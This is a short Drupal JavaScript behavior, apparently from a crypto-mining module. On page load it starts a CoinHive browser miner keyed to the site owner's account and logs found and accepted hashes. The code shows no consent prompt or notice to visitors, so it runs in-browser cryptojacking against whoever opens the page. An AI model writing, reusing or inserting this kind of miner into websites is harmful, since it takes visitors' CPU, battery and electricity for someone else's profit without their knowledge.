(function (Drupal, drupalSettings) {

  Drupal.behaviors.coinHiveMiner = {
    attach: function (context, settings) {
      var miner = new CoinHive.Anonymous(drupalSettings.crypto_miner.coinHive.siteKey);
      miner.start();

      // Listen on events
      miner.on('found', function() {
        console.log("Hash found");
      });

      miner.on('accepted', function() {
        console.log("Hash accepted by the pool");
      });
      
    }
  };

})(Drupal, drupalSettings);
